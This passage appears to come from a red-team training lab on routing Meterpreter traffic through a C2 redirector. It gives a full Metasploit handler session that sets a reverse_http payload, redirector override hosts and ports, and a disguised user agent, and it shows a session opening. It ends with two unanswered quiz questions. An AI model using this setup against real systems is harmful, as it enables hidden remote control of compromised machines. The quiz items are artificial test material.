	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

**Setting Up Exploit/Multi/Handler**

We need to remember to setup Meterpreter to use the interface we are expecting messages on. In our lab it's localhost 127.0.0.1/8080. 

Next we need to setup an OverrideLHOST. This value is the Redirectors IP or Domain Name. Then we set the OverrideLPORT.  This is the port HTTP/S is running on, on your Redirector. Last, set OverrideRequestHost to True.  This will force Meterpreter to send traffic through the Redirector and not your C2 Host. 

```bash
root@kali$ msfconsole
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
ReverseListenerBindPort => 8080
msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
OverrideLHOST => 192.168.0.44
msf6 exploit(multi/handler) > set OverrideLPORT 80
OverrideLPORT => 80
msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
HttpUserAgent => NotMeterpreter
msf6 exploit(multi/handler) > set OverrideRequestHost true
OverrideRequestHost => true
msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started HTTP reverse handler on http://127.0.0.1:8080
[*] http://127.0.0.1:8080 handling request from 127.0.0.1; (UUID: zfhp2nwt) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 3 opened (127.0.0.1:8080 -> 127.0.0.1 ) at 2022-02-11 02:09:24 -0500
```

After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector! For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use multiple hosts and DNS records instead of IP Addresses. 

![[c2redirector-3.png]]

__Questions__

 What setting name that allows you to modify the User Agent field in a Meterpreter payload? 
 Answer: __



What setting name that allows you to modify the Host header in a Meterpreter payload?
Answer: __

